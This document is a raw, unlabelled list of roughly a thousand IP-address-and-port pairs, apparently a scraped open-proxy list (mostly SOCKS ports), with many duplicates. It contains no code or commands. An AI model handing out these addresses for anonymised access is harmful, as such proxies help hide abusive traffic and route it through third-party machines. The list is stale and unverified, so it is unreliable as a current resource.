67.213.212.53:38354
41.79.10.218:4673
47.180.63.37:54321
121.200.63.38:4153
51.75.126.150:51713
51.15.254.129:16379
176.236.163.38:59311
162.144.36.208:52517
45.172.177.253:59341
94.153.159.98:4153
103.68.3.114:4145
181.13.198.90:4153
103.124.137.251:1080
23.19.244.109:1080
162.241.46.6:62244
135.148.10.161:51507
66.228.35.209:44809
216.215.125.178:48324
147.124.212.31:36779
201.174.17.126:7755
104.238.111.107:60214
92.204.135.203:29212
139.162.238.184:29588
166.62.38.100:55671
165.227.104.122:41443
159.223.166.21:5199
31.170.22.127:1080
167.172.159.43:1162
51.38.63.124:27294
192.99.207.129:26567
185.236.46.221:5678
186.216.195.1:4153
178.79.165.164:64354
198.12.255.193:48572
177.38.245.109:55713
1.15.62.12:5678
147.124.212.31:13276
162.241.6.97:56399
198.57.211.235:11096
192.169.226.96:50578
192.163.200.80:22472
91.241.131.179:9834
104.238.111.107:56225
176.99.2.43:1080
179.27.86.36:4153
50.63.12.33:14738
166.62.36.126:45982
147.182.194.76:29703
37.32.98.160:7302
80.241.44.34:5678
162.241.46.69:53783
103.92.235.60:27618
51.89.173.40:55198
186.224.225.26:42648
94.23.252.168:9180
176.126.85.247:16379
92.205.61.38:29249
5.252.23.220:1080
209.126.104.38:40750
151.236.39.7:58111
199.85.209.166:61430
192.141.236.3:5678
92.205.61.38:56139
162.214.121.11:2993
94.131.14.66:1080
185.97.114.179:3629
162.144.121.232:16795
157.230.250.185:1279
92.204.134.38:51123
103.121.39.158:1080
207.244.229.34:46497
161.97.173.42:15015
213.136.79.177:13675
165.227.196.37:63742
51.89.173.40:27887
200.85.34.174:4153
188.163.170.130:35578
51.158.98.211:16379
45.226.1.1:4153
50.63.13.3:31503
64.91.226.205:64441
51.158.68.237:16379
194.233.78.142:41119
65.49.82.7:58195
132.148.128.8:7392
157.230.250.185:61214
209.13.96.165:39921
66.228.35.209:46695
162.214.103.84:48292
92.205.60.110:32503
103.74.227.177:56417
104.238.111.107:30026
94.23.83.53:55806
157.245.131.28:30422
166.62.38.100:54083
159.203.5.54:58249
162.240.22.184:43494
50.63.13.3:40129
107.180.88.173:58620
92.204.135.203:34780
66.228.33.190:44809
146.59.18.246:49871
162.241.53.72:55693
104.236.0.129:29249
37.187.91.192:17605
104.238.111.107:26305
163.172.165.36:16379
51.158.78.200:16379
92.205.110.118:64422
162.241.53.72:47856
162.241.46.6:60708
146.59.18.246:64741
162.214.154.141:43581
31.7.65.18:443
178.32.143.55:32048
161.97.163.52:18693
192.169.244.80:41568
208.109.14.49:59760
188.164.196.31:53276
192.169.244.80:49588
162.241.158.204:62847
213.136.78.200:40927
162.214.170.144:16684
104.238.111.107:36049
132.148.167.243:40961
107.180.88.173:59820
45.249.48.217:4153
163.172.158.70:16379
162.240.208.98:43704
51.89.21.99:11158
207.180.234.220:47476
194.31.79.75:25900
157.230.250.185:51499
107.180.90.248:40330
208.109.14.49:36795
192.163.202.88:39782
51.158.105.203:16379
103.174.214.54:5678
216.10.242.18:15881
188.166.234.144:19738
51.15.241.5:16379
132.148.245.112:14103
148.66.130.53:13305
164.92.237.188:53238
173.212.209.49:13025
117.74.65.207:53446
117.74.65.207:5555
117.74.65.207:54466
104.248.158.78:43620
117.74.65.207:39732
117.74.65.207:61011
117.74.65.207:8009
165.227.196.37:56755
162.241.50.179:40170
162.241.6.97:52000
162.241.53.72:49858
209.126.104.38:40053
162.241.46.54:34236
70.35.213.226:4153
70.60.132.130:5678
138.0.229.232:4153
162.214.121.173:64382
198.12.253.239:38588
107.180.89.55:63136
203.161.32.242:61356
162.214.102.195:58994
51.89.173.40:11058
207.244.229.34:7976
188.165.252.198:10661
161.97.165.57:6484
209.126.104.38:39369
165.227.104.122:29992
188.164.197.178:4026
50.63.12.33:58507
66.228.33.190:24360
162.241.53.72:40170
45.81.232.17:61553
62.171.131.101:1385
162.243.55.12:50941
155.133.57.22:4153
166.62.38.100:39308
80.51.7.66:4145
4.14.120.230:39593
130.193.123.34:5678
75.119.145.169:62630
45.81.232.17:30696
51.89.173.40:51612
111.8.155.54:7777
62.73.127.98:9898
209.198.43.52:5678
14.232.160.247:10801
148.66.130.187:63840
154.16.116.166:2512
162.240.72.139:2451
36.95.48.45:1080
162.241.158.204:52000
92.205.110.47:16865
87.238.192.249:51484
72.167.222.113:12581
197.234.13.27:4145
207.180.198.241:57327
45.138.87.238:1080
45.81.232.17:27308
194.31.79.75:50920
36.93.138.75:5678
192.64.115.90:25462
185.95.227.244:4145
109.238.12.156:24586
5.58.47.25:3629
101.51.121.29:4153
45.81.232.17:21481
51.222.241.8:36219
198.12.255.193:45274
12.218.209.130:13326
212.87.255.155:5678
103.81.117.122:4153
104.238.100.115:45314
103.18.47.79:4145
113.53.29.228:13629
1.15.62.12:5678
104.236.171.128:41047
103.127.56.236:5678
103.102.141.39:4145
104.236.0.129:53343
103.131.8.37:5678
109.238.12.156:28618
109.238.12.156:24586
111.8.155.54:7777
103.35.189.217:1080
104.248.151.220:60018
104.238.111.107:60214
138.197.92.110:38552
142.93.151.99:45365
109.238.12.156:26912
104.238.111.107:53777
104.248.151.220:60915
104.238.111.107:8968
107.180.90.248:39929
110.77.149.50:5678
118.97.107.65:5430
123.231.230.58:31196
170.244.0.179:4145
115.79.26.196:1080
132.148.128.8:22773
120.42.35.91:35010
177.234.192.47:32213
161.97.74.176:30000
167.172.159.43:1162
132.148.20.70:18504
132.148.245.112:49824
162.144.79.97:2877
159.224.243.185:61303
132.148.128.8:7392
190.153.121.2:4145
168.194.226.178:4153
157.230.250.185:1279
157.245.255.109:27341
162.241.158.204:62847
185.139.56.133:4145
165.227.104.122:29992
130.255.162.199:20398
12.7.109.1:8899
132.148.16.169:41824
132.148.167.243:41644
130.255.162.199:44234
162.214.102.195:56755
159.192.139.42:5678
144.76.96.180:5566
190.0.15.18:5678
163.172.158.70:16379
163.172.129.251:16379
164.92.237.188:53364
132.148.167.243:29514
162.241.46.69:53783
163.172.144.132:16379
162.241.46.40:46097
128.199.165.63:58951
162.254.38.202:24000
128.199.221.91:2215
132.148.167.243:3404
185.87.121.35:8975
166.62.38.100:39308
185.87.121.5:8975
165.227.196.37:54266
151.236.39.7:59202
162.241.45.22:50207
147.124.212.31:30508
162.241.79.22:36936
162.241.46.40:60102
161.97.173.42:41558
167.99.39.82:13486
165.227.196.37:63742
139.162.238.184:47310
170.81.141.49:61437
163.172.147.89:16379
148.72.23.56:4833
147.124.212.31:51825
14.241.241.185:4145
163.172.171.22:16379
162.241.6.97:62847
163.172.137.49:16379
148.72.23.56:41383
146.59.18.246:15860
161.97.147.193:43131
159.223.166.21:5078
162.144.36.208:52517
161.97.147.193:55283
166.62.38.100:2453
147.124.212.31:13276
162.214.170.144:39503
179.27.86.36:4153
162.241.53.72:55693
159.203.5.54:58249
148.72.206.84:41691
162.214.121.173:35183
162.240.208.98:43704
162.241.79.22:41641
164.92.237.188:57392
148.72.206.84:2536
164.92.237.188:59045
162.214.154.178:43581
144.91.66.30:27566
144.91.66.30:61465
159.223.71.71:61818
161.97.173.42:44479
148.72.209.174:39027
144.91.66.30:58285
151.236.39.7:58111
159.223.71.71:56581
161.97.163.52:59181
159.223.71.71:52542
172.93.111.87:15805
198.12.253.239:36895
192.163.200.200:19747
23.19.244.109:1080
192.99.207.129:29360
200.108.190.185:9800
187.210.136.88:4153
174.136.57.169:33761
173.212.209.49:36790
213.19.205.18:54321
185.51.92.84:51327
185.236.46.221:5678
188.164.197.178:4026
185.95.227.244:4145
188.190.176.114:5678
213.14.31.123:35314
181.57.138.70:4153
198.57.211.235:11096
185.186.17.57:5678
192.163.200.93:22179
192.99.207.129:26567
213.222.34.200:4145
178.79.165.164:64354
202.40.186.66:1088
209.126.104.38:40750
198.12.255.193:48572
185.129.250.183:14462
183.88.247.52:4153
31.170.22.127:1080
213.136.75.85:50573
213.210.67.186:3629
192.169.226.96:31640
198.12.255.193:6821
198.12.255.193:22785
199.85.209.166:61430
198.12.253.1:62302
198.12.255.193:40099
188.164.193.178:11251
208.109.14.49:7218
209.126.104.38:39039
209.126.104.38:15097
207.180.234.220:39323
207.180.234.220:36946
209.13.96.165:39921
206.42.40.0:5678
213.6.68.94:5678
209.126.104.38:39369
213.16.81.182:35559
209.126.104.38:12457
3.9.71.167:3128
36.93.138.75:5678
213.136.78.200:28513
218.3.253.238:10800
37.187.91.192:11721
45.79.56.187:40114
18.135.133.116:3128
18.169.83.87:1080
51.222.241.8:49559
70.60.132.130:5678
78.90.252.7:4153
45.115.1.14:5678
46.99.252.42:10805
51.158.64.130:16379
51.15.211.42:16379
74.62.23.242:39593
50.63.13.3:31503
51.15.139.15:16379
51.158.79.76:16379
23.19.244.109:1080
67.205.177.122:21108
92.204.135.203:29212
92.204.134.38:42571
92.204.136.149:16066
92.204.135.37:26545
51.222.241.8:62916
162.240.147.48:37704
50.63.13.3:50887
50.63.12.33:14738
50.63.13.3:41412
139.162.238.184:21017
51.89.173.40:27887
31.170.22.127:1080
51.75.126.150:36323
45.138.87.238:1080
51.161.99.114:29758
45.81.232.17:30696
51.38.63.124:27294
45.65.65.18:4145
66.228.33.190:24360
64.91.226.205:64441
46.109.146.244:4145
70.60.132.130:5678
91.224.179.175:5678
91.224.179.175:5678
46.188.2.42:5678
65.49.67.161:48324
46.214.153.223:5678
50.63.12.33:61464
92.204.134.38:34261
51.89.173.40:23313
51.89.173.40:17982
51.89.173.40:14179
51.89.173.40:51511
5.135.137.13:59124
5.252.23.206:1080
103.165.37.245:4145
51.89.173.40:31724
54.36.122.16:17188
62.103.186.66:4153
5.188.66.181:8088
5.252.23.249:1080
162.55.87.48:5566
45.81.232.17:33549
50.63.12.33:58507
51.75.126.150:36580
94.181.33.149:40840
45.81.232.17:27308
169.255.198.8:5678
105.214.72.106:5678
83.234.76.155:4145
50.63.12.33:45134
46.226.148.105:9352
50.63.12.33:52814
212.115.232.79:10800
84.52.123.163:4145
50.63.13.3:28732
111.8.155.54:7777
51.15.241.5:16379
146.59.18.246:30673
50.63.13.3:56571
38.113.171.88:57775
159.223.166.21:5078
92.204.134.38:52929
62.171.131.101:25847
72.167.221.145:42043
162.214.191.209:33977
92.204.134.38:52929
162.241.53.72:57495
92.205.28.245:8560
176.126.85.247:16379
60.217.64.237:35292
54.36.108.149:37947
162.241.46.40:62244
51.79.87.144:54395
135.148.10.161:31696
62.171.131.101:44827
92.204.135.203:34780
95.128.142.76:1080
45.81.232.17:23363
72.167.222.113:12581
103.74.227.177:56417
95.188.82.147:3629
50.63.12.33:9367
77.77.26.152:4153
72.252.4.49:4145
177.38.245.109:55713
186.211.6.137:4145
81.16.1.71:5678
88.213.214.254:4145
86.110.189.118:42539
51.38.63.124:10983
159.223.166.21:5199
67.227.186.83:63716
37.32.98.160:8998
163.172.144.132:16379
173.212.209.49:39522
91.213.119.246:46024
185.109.184.150:53155
181.212.136.34:42400
162.241.46.54:58330
91.241.131.179:9834
78.128.95.125:4153
190.144.167.178:5678
51.75.125.208:27029
51.15.254.129:16379
72.167.222.113:4125
51.15.139.15:16379
162.241.46.6:62244
159.223.166.21:49174
162.241.45.22:50528
162.254.38.202:24000
185.139.56.133:4145
92.205.110.47:19600
82.223.121.72:21955
37.18.73.60:5566
18.130.220.28:8193
88.202.230.103:55624
161.97.173.42:59799
132.148.128.8:22773
162.214.163.137:50509
50.250.56.129:9898
104.238.111.107:8968
92.205.61.38:4726
36.64.238.82:1080
94.23.252.168:9180
162.241.45.22:55610
38.133.200.94:31596
94.153.159.98:4153
162.241.46.40:62592
36.37.251.171:5678
181.209.96.226:4153
165.227.196.37:63742
82.223.121.72:64871
162.241.6.97:58447
135.148.10.161:51507
147.124.212.31:4671
162.241.6.97:62847
51.75.126.150:36323
113.11.131.146:5678
148.66.130.53:13305
36.92.166.196:1080
198.12.255.193:53281
164.92.86.113:63358
92.205.61.38:56139
198.12.255.193:48572
132.148.245.169:36149
97.74.233.206:16744
207.180.198.241:47936
45.79.56.187:40114
50.63.12.33:31785
162.241.79.22:39107
37.187.91.192:21981
92.204.135.203:29212
92.205.110.118:64422
173.249.33.122:13576
107.180.88.173:58620
92.205.61.38:24663
162.241.46.6:50062
172.104.154.229:11142
51.15.21.216:57679
181.129.198.58:5678
161.97.163.52:29631
92.205.110.47:6140
37.187.91.192:11721
49.156.42.186:5678
92.205.61.38:36073
15.235.187.227:62640
128.199.221.91:7176
103.96.38.166:80
46.8.60.2:1080
194.233.78.142:41720
103.165.175.71:5678
72.167.222.113:41629
198.12.253.239:38588
161.97.147.193:1599
92.204.134.38:7785
51.161.33.206:2542
104.238.111.107:45883
51.91.13.215:55637
162.241.53.72:55693
162.214.191.59:33977
161.97.173.42:41558
104.236.0.129:29249
173.212.209.49:36790
162.241.46.40:33268
213.16.81.147:5678
107.180.89.185:49062
165.227.196.37:63399
107.180.90.88:62908
164.92.86.113:50564
162.241.158.204:62847
162.241.158.204:58447
51.158.105.203:16379
209.126.104.38:40053
50.238.47.86:32100
92.204.134.38:28695
162.241.46.6:46097
162.214.102.195:58994
162.241.6.97:56399
167.86.102.169:16823
187.210.136.88:4153
157.230.250.185:17773
103.35.189.217:1080
173.212.209.49:64309
173.212.237.43:6775
166.62.38.100:2522
185.220.174.99:59967
51.158.78.200:16379
31.170.17.141:4153
162.144.121.232:16795
94.131.14.66:1080
104.238.111.107:5452
51.15.241.5:16379
66.228.35.209:44809
65.49.82.7:58195
162.241.46.40:56241
82.130.202.219:43429
162.241.79.22:50207
132.148.128.8:7392
92.205.110.118:53903
50.63.12.33:14738
50.63.12.33:23859
50.63.13.3:50887
66.228.33.190:14791
166.62.38.100:54083
173.212.237.43:26131
164.92.237.188:55588
92.204.135.203:61635
162.214.170.144:37362
94.23.220.136:35805
213.136.79.177:13675
51.38.63.124:10983
88.255.106.26:10820
50.63.12.33:50781
162.241.6.97:52000
104.248.158.78:62952
161.97.173.78:53427
162.241.46.69:53783
103.118.47.74:4145
165.227.196.37:54266
147.124.212.31:51825
146.59.18.246:9755
45.81.232.17:48085
51.79.87.144:30464
37.228.65.107:51032
50.63.13.3:55749
186.248.87.172:5678
162.0.220.222:57020
213.136.75.85:50573
51.161.33.206:29360
188.164.193.178:17585
159.223.71.71:49922
154.12.253.232:57447
201.174.17.126:7755
43.229.85.48:49665
162.241.158.204:52000
162.214.75.86:52163
148.72.209.174:4734
38.242.136.254:15625
160.153.245.187:35573
50.63.12.101:2953
45.226.1.1:4153
203.161.32.242:50640
37.187.73.7:23637
67.225.255.197:55889
217.27.149.190:4153
209.126.104.38:39369
51.68.164.77:16664
213.136.75.85:57607
66.228.35.209:46695
135.148.10.161:3970
209.14.112.7:1080
54.38.179.162:7848
154.16.116.166:2512
104.238.111.107:56225
132.148.245.169:19483
162.241.53.72:57364
160.153.245.187:42879
104.238.111.107:37963
107.180.88.173:53312
51.222.241.8:49559
51.161.99.114:29758
148.72.23.56:4833
37.187.91.192:27898
103.72.79.250:5122
162.241.45.22:44931
162.144.36.208:38242
104.238.111.107:15073
148.72.23.56:39396
185.95.227.244:4145
62.171.131.101:1385
95.111.227.164:54576
104.37.12.129:1080
5.135.137.13:59124
50.250.56.129:9898
208.109.14.49:7218
162.241.53.72:49858
23.19.244.109:1080
161.97.74.176:30000
164.132.112.254:44664
50.63.13.3:40129
92.204.136.149:16066
47.180.63.37:54321
161.97.163.52:64109
96.36.50.99:39593
161.97.163.52:23288
176.77.9.22:5678
173.212.237.43:26131
162.214.121.173:31179
92.205.110.47:50709
64.91.226.205:64441
167.99.39.82:13486
147.124.212.31:4671
208.109.14.49:59760
202.183.155.242:4153
50.63.12.33:30920
103.75.199.184:9165
183.88.240.139:4153
50.63.12.33:40838
148.72.209.174:2906
208.109.13.93:53778
146.59.18.246:49871
208.109.14.49:36795
161.97.173.42:9830
173.249.33.122:24654
194.163.159.94:35081
51.15.132.215:16379
92.204.135.203:61635
162.241.6.97:56399
66.228.37.252:7841
159.223.166.21:49174
172.93.111.87:15805
172.93.111.235:62543
67.227.186.23:64153
165.227.196.37:63742
132.148.16.169:41824
107.180.88.173:59820
65.49.82.7:58195
104.238.111.107:5452
167.172.159.43:1162
92.205.110.118:54440
51.38.63.124:10983
92.205.110.118:5513
51.89.173.40:11058
163.172.129.251:16379
194.31.79.75:31471
154.16.116.166:2512
170.81.141.49:61437
162.214.90.49:59997
67.225.255.197:55889
209.126.104.38:16608
161.97.173.42:24148
45.117.179.179:14791
164.92.86.113:64110
154.12.253.232:4607
45.81.232.17:53288
109.123.254.43:10769
62.171.131.101:1385
92.205.110.118:7895
178.79.165.164:64354
101.2.166.218:1088
184.168.121.153:1397
37.32.98.160:37758
103.47.93.198:1080
103.12.246.109:4145
92.205.60.110:32503
31.42.184.144:57752
104.247.163.246:54094
132.148.167.243:49612
203.96.177.211:55005
190.0.15.18:5678
207.180.234.220:48963
213.190.26.158:1080
162.241.46.40:41442
162.241.53.72:31414
160.153.245.187:38586
50.63.12.101:6095
160.153.245.187:35138
198.12.255.193:6821
50.63.12.101:17559
103.72.79.250:5122
45.172.177.253:59341
117.198.221.34:4153
159.203.5.54:58249
51.75.126.150:11802
37.32.98.160:7302
163.172.137.49:16379
103.121.39.158:1080
157.230.250.185:1279
203.161.32.218:50640
190.153.121.2:4145
162.241.6.97:52000
162.241.6.97:58447
201.174.17.126:7755
162.214.162.180:46369
162.241.46.6:60708
31.210.134.114:13080
162.241.53.72:40170
66.228.35.209:44809
162.214.102.195:56755
91.203.114.71:42905
176.113.157.149:37417
192.169.226.96:43328
46.29.116.6:4145
188.164.197.178:4026
195.168.91.238:4153
162.214.163.137:50509
79.101.45.94:56921
177.184.67.69:4145
107.180.101.226:35316
103.35.189.217:1080
130.255.162.199:20398
103.18.47.79:4145
169.255.198.8:5678
146.59.18.246:9755
161.97.163.52:29631
51.15.223.24:16379
103.76.172.230:4153
66.228.33.190:14791
8.42.68.197:39593
166.62.38.100:55671
192.99.207.129:2542
185.82.218.52:1080
18.135.133.116:80
209.126.104.38:40053
159.223.166.21:5199
91.213.119.246:46024
212.50.19.150:4153
209.126.104.38:39369
217.145.199.47:56746
107.180.88.173:36503
176.99.2.43:1080
95.111.227.164:18415
92.204.135.203:29212
162.214.102.195:50366
162.241.50.179:35948
139.162.238.184:21017
209.126.104.38:15097
200.108.190.6:9800
162.240.72.139:20270
89.218.8.152:1080
161.97.173.78:45671
181.129.62.2:47377
37.187.73.7:10362
165.227.196.37:53718
207.180.198.241:35119
79.106.170.126:4145
202.142.159.204:31026
162.214.154.177:32753
162.241.158.204:62847
139.162.238.184:29588
162.214.170.144:37362
163.172.165.36:16379
185.23.118.252:61091
36.92.56.65:5678
37.18.73.60:5566
173.212.237.43:57562
162.240.72.139:20614
92.204.134.38:42571
165.227.196.37:63551
107.180.90.88:7936
162.240.147.48:37704
166.62.38.100:54083
135.148.10.161:31696
162.241.46.40:49401
51.89.173.40:51511
170.244.0.179:4145
54.36.122.16:44587
45.226.1.1:4153
107.180.90.248:39929
185.95.227.244:4145
159.148.146.65:5678
148.66.130.53:21794
162.241.50.179:40170
54.36.122.16:17188
60.217.64.237:35292
103.23.41.110:30058
132.148.245.247:26295
66.228.35.209:46695
51.161.33.206:26567
164.92.86.113:63358
198.12.253.239:36895
45.81.232.17:48085
132.148.245.169:36149
79.106.170.126:4145
75.119.145.169:62630
45.81.232.17:17639
162.55.87.48:5566
5.252.23.249:1080
207.180.198.241:57327
162.241.46.6:53477
159.223.166.21:5078
50.63.13.3:31503
181.129.198.58:5678
37.187.91.192:11721
166.62.38.100:39308
195.74.72.111:5678
192.163.200.80:22179
176.120.32.135:5678
166.62.38.100:2522
50.63.12.33:61464
46.209.100.252:5678
148.72.23.56:60069
199.85.209.142:40573
36.95.48.45:1080
162.214.121.173:64382
132.148.20.70:18504
82.223.121.72:64871
64.124.145.1:1080
8.42.68.125:39593
50.63.12.33:52814
51.15.142.4:16379
85.100.40.12:5678
188.64.113.104:1080
194.85.135.243:4145
46.23.141.142:5678
24.37.245.42:51056
181.129.74.58:30431
190.184.144.222:5678
91.213.119.246:46024
91.200.114.58:55749
93.175.194.155:3629
177.104.87.23:5678
213.190.26.158:1080
212.156.217.147:4153
94.253.95.241:3629
86.110.189.118:42539
130.193.123.34:5678
45.187.76.2:3629
100.1.53.24:5678
177.136.124.36:3629
203.210.235.91:5678
178.220.148.82:10801
46.188.2.42:5678
110.77.149.50:5678
1.179.147.5:52210
118.97.107.65:5430
91.247.250.215:4145
195.138.73.54:31145
88.255.102.114:1082
51.158.124.167:16379
61.155.235.58:10800
213.172.89.227:4153
177.73.248.26:55290
213.210.67.186:3629
51.15.252.246:16379
58.18.39.58:10800
103.221.254.102:54409
103.88.126.170:5678
103.242.175.119:8899
103.95.97.53:4153
110.74.195.2:4153
112.78.39.94:4153
114.108.177.104:60984
119.235.50.5:4145
119.15.89.87:5678
118.91.175.146:5678
118.70.126.245:5678
125.70.227.214:10800
171.221.174.230:10800
180.178.104.107:5678
180.180.124.248:49992
183.69.128.198:5678
182.34.195.204:1080
183.81.153.25:5678
218.3.253.238:10800
18.130.220.28:8193
211.196.195.46:4145
218.83.201.226:10800
13.234.24.116:1080
212.115.232.79:10800
187.216.144.170:5678
15.207.35.241:1080
159.223.166.21:47460
177.38.245.109:55713
65.1.244.232:1080
35.154.71.72:1080
92.204.134.38:25825
144.76.96.180:5566
114.4.200.222:5678
65.1.244.232:80
103.217.213.145:4145
159.223.166.21:5078
51.15.211.42:16379
187.210.136.88:4153
51.38.63.124:27294
192.169.244.80:49588
162.241.158.204:62847
154.12.253.232:47800
5.135.137.13:59124
5.252.23.220:1080
177.222.60.138:5678
162.241.6.97:56399
192.64.115.90:39948
67.227.186.83:63716
159.223.166.21:1372
162.241.158.204:52000
51.15.230.100:16379
176.126.85.247:16379
162.241.158.204:58447
51.15.211.42:16379
78.128.95.125:4153
162.240.19.133:56483
209.126.104.38:40053
209.126.104.38:16608
157.245.255.109:27341
107.180.95.177:1405
51.161.33.206:26567
94.182.26.44:4153
188.164.197.178:55677
18.130.220.28:8193
163.172.147.9:16379
170.81.141.49:61437
109.238.12.156:28618
165.227.196.37:63551
51.15.241.5:16379
51.222.241.8:36219
75.119.145.169:38023
162.240.79.122:61792
163.172.153.194:16379
135.148.10.161:31696
67.225.255.197:55889
162.241.46.40:56241
203.161.32.242:61356
67.205.177.122:61942
85.25.177.53:58851
14.241.182.44:5678
36.64.62.111:5678
163.172.165.36:16379
148.72.212.252:33516
146.59.18.246:15860
163.172.132.238:16379
154.12.253.232:12263
51.79.87.144:8533
162.214.102.195:56755
192.169.226.96:4850
51.158.111.76:16379
78.128.8.156:46485
95.216.224.61:59792
181.129.74.58:30431
1.179.148.9:36476
38.127.172.137:47421
159.223.166.21:5199
162.240.147.48:37704
163.172.144.132:16379
51.158.78.200:16379
92.205.61.38:21286
146.59.18.246:20734
162.214.90.49:57785
162.144.121.232:16795
104.238.111.107:5484
134.122.43.203:56442
147.124.212.31:4671
104.238.111.107:5484
91.224.179.175:5678
160.153.245.187:59786
162.241.6.97:52000
50.63.12.33:61464
37.32.98.160:54647
132.148.167.243:29514
194.163.129.90:43076
92.204.135.203:10824
50.63.12.33:45134
94.23.252.168:9180
203.96.177.211:48553
193.106.57.96:5678
198.57.195.42:17986
107.180.90.88:63100
82.204.198.28:1080
185.82.218.52:1080
107.180.95.177:63951
162.241.6.97:58447
213.136.78.200:28513
88.202.230.103:55624
51.75.126.150:11802
107.180.90.88:23880
138.197.92.110:38552
37.187.141.160:49039
45.79.56.187:40114
167.172.159.43:1162
111.8.155.54:7777
92.205.61.38:50903
66.228.35.209:46648
181.13.142.45:5678
51.75.126.150:36694
188.164.193.178:2592
166.62.38.100:54083
104.236.0.129:29249
66.29.131.58:30060
162.214.170.144:37362
198.12.255.193:32216
45.81.232.17:24079
213.136.78.200:58283
51.158.119.71:16379
154.12.255.155:64560
178.32.143.55:32048
161.97.163.52:29631
109.238.12.156:24586
51.15.139.15:16379
94.131.14.66:1080
207.244.229.34:46497
159.89.194.121:46377
92.204.135.203:29212
132.148.245.112:49824
5.252.23.249:1080
147.124.212.31:51825
113.11.131.146:5678
163.172.129.251:16379
162.144.103.99:60415
162.214.154.178:32753
95.111.227.164:18415
148.72.215.79:11423
198.12.255.193:45274
162.214.191.59:33977
162.214.121.11:18809
54.36.122.16:44587
146.59.18.246:40975
162.241.79.22:35318
104.238.111.107:26305
80.122.170.182:4153
148.66.130.187:20962
146.59.18.246:64741
209.126.104.38:39369
31.200.242.201:12196
162.144.103.99:2291
186.216.195.1:4153
50.63.12.33:51904
162.241.46.6:56241
51.89.173.40:51612
148.72.23.56:3260
162.241.45.22:50207
107.180.88.173:35774
92.204.135.203:61635
50.63.12.33:31785
51.15.247.93:16379
92.204.135.203:34780
162.241.50.179:37876
78.128.8.156:46485
213.136.79.177:13675
103.44.15.193:4145
166.62.38.100:32216
37.32.98.160:7302
139.255.86.226:5678
132.148.16.169:11320
36.94.110.49:5678
46.231.72.35:5678
104.238.111.107:60214
185.109.184.150:53155
50.63.12.33:34644
173.212.237.43:10302
202.144.134.150:5678
109.238.12.156:1365
91.134.140.160:3985
92.205.61.38:4300
148.66.130.53:23998
18.130.220.28:8193
18.130.220.28:8193
18.130.220.28:8193
45.238.57.1:3629
24.249.199.4:4145
172.93.111.87:40166
167.172.159.43:1162
82.193.103.54:5678
195.140.226.32:5678
104.200.152.30:4145
209.14.112.2:1080
94.23.252.168:9180
167.172.159.43:1162
72.195.34.41:4145
185.72.225.10:44098
68.71.249.153:48606
18.130.220.28:8193
162.214.102.195:56051
185.72.225.10:44098
45.4.144.232:4153
67.227.186.23:64153
91.203.114.71:42905
162.144.32.209:20147
176.192.65.34:5020
187.44.211.118:4153
162.55.87.48:5566
162.215.219.157:48117
93.91.148.34:9898
181.143.21.146:4153
162.214.121.173:35183
174.136.57.169:33761
159.148.146.65:5678
146.120.160.148:5678
103.14.251.16:4153
37.18.73.60:5566
162.214.90.49:51918
216.169.73.65:60221
162.240.22.184:48026
72.252.4.49:4145
195.140.226.32:5678
94.23.252.168:9180
192.99.207.129:29360
88.202.230.103:39647
212.115.232.79:10800
166.62.88.163:49263
92.204.134.38:52929
162.240.10.35:46810
212.79.107.116:5678
92.204.134.38:28695
72.167.220.46:28810
87.238.192.204:30068
192.64.115.90:39948
51.161.33.206:2542
38.133.200.94:31596
96.70.52.227:48324
64.124.191.98:32688
139.255.193.243:7623
164.92.86.113:57391
144.76.96.180:5566
164.92.237.188:53364
54.36.122.16:39713
5.252.23.249:1080
64.202.186.2:32884
121.139.218.165:43295
162.144.36.208:38242
132.148.16.169:52326
162.214.121.173:44826
186.145.192.251:5678
162.241.46.54:58330
199.102.106.94:4145
187.95.82.254:3629
67.227.186.23:57676
51.161.33.206:29360
188.164.197.178:15452
198.57.229.185:64767
130.193.126.244:5678
209.222.97.30:40166
198.12.253.239:38588
192.169.226.96:32074
24.37.245.42:51056
162.240.22.169:34157
217.27.149.190:4153
50.63.13.3:41412
50.63.13.3:14920
104.238.111.107:45883
54.36.122.16:44587
179.189.219.98:4145
95.128.142.76:1080
200.85.52.254:5678
161.97.163.52:64109
137.184.182.145:9338
107.180.88.173:44568
164.132.112.254:44664
162.144.103.99:60415
91.201.240.84:5678
92.205.28.245:53287
194.233.78.142:41720
107.180.101.18:19512
87.238.192.204:30068
138.68.155.22:36259
172.93.111.87:40166
159.223.166.21:47460
212.103.118.77:5678
148.72.23.56:60069
159.223.166.21:21898
37.32.98.160:7302
80.65.28.57:30924
209.222.97.30:40166
132.148.128.8:54459
5.252.23.249:1080
103.116.174.125:5678
162.214.102.195:60891
194.163.129.90:43076
162.241.70.64:57527
148.66.130.53:5031
46.98.191.58:1111
212.115.232.79:10800
192.163.200.80:22472
161.97.165.57:6484
51.222.241.8:36219
92.205.61.38:21286
51.161.33.206:26567
179.48.155.152:4153
192.99.207.129:26567
164.92.86.113:63358
54.36.122.16:29796
103.235.66.198:5678
192.140.42.83:59057
172.93.111.87:25485
51.75.125.208:27029
190.108.84.168:4145
162.241.46.40:60102
182.53.216.4:4153
103.121.39.158:1080
162.241.53.72:30828
78.128.81.220:44286
164.92.86.113:54597
203.161.32.242:50640
51.75.71.110:12097
107.180.89.55:63136
51.222.241.8:49559
92.204.135.203:10824
207.180.198.241:37209
50.235.117.234:39593
50.63.12.33:31785
51.222.241.8:7822
92.205.110.118:49586
51.75.126.150:36580
108.175.24.1:13135
190.104.26.227:33638
94.131.14.66:1080
94.23.220.136:38629
51.222.241.157:43254
176.236.37.132:1080
162.214.102.195:56755
163.172.166.35:16379
203.161.32.242:50640
107.180.92.72:48478
132.148.167.243:28040
193.34.237.241:1080
92.205.28.245:53287
209.14.112.6:1080
178.79.165.164:29990
67.205.177.122:53344
202.183.155.242:4153
198.12.255.193:22785
162.240.79.122:61792
168.194.75.98:8888
103.121.39.158:1080
72.167.222.113:12581
208.109.13.93:56231
162.241.46.69:62797
164.132.112.254:44664
162.241.46.40:62244
146.59.70.29:33076
139.162.238.184:13302
198.12.255.193:6821
109.120.222.90:1080
188.164.193.178:53565
159.223.71.71:53741
31.163.192.152:4153
162.255.110.52:5678
184.181.217.213:4145
165.227.104.122:41443
207.244.229.34:7976
103.234.24.40:5678
92.204.134.38:34261
192.64.115.90:25462
207.180.198.241:60148
176.118.52.129:3629
51.222.241.8:36219
182.93.69.74:5678
148.72.209.174:4734
147.124.212.31:24230
92.205.61.38:24183
163.172.147.9:16379
135.148.10.161:60415
162.214.121.11:3549
103.107.68.5:5430
161.97.163.52:55491
105.214.65.244:5678
103.35.189.217:1080
192.163.200.82:35396
148.72.209.174:39458
84.2.239.42:4153
31.200.242.201:12196
165.227.196.37:61899
104.251.212.206:34012
